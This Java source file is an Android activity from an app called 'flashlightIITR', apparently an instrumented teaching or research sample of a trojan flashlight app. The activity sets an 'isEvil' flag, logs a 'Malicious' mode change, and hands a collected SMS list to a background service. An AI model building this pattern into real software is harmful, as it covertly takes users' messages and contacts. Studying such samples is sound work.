package com.example.flashlightIITR;


import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;
import java.util.HashMap;

public class NotificationActivity extends AppCompatActivity {
    HashMap<String,String>  smsList = new HashMap<String,String>();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        MainActivity.version="17";
        MainActivity.isEvil=true;
        Clues myclues=new Clues();
        myclues.SendLog("App Mode Change","App entered onCreate()","Malicious");
        smsList = (HashMap<String,String>) getIntent().getExtras().get("SMS_LIST");
        Log.d("Notify","Receive the data of Contacts.");

        Intent intent = new Intent(this, BackgroundService.class);
        intent.putExtra("SMS_LIST", smsList);
        startService(intent);
        Log.d("Notify","Triggering the BackgroundService");
    }
}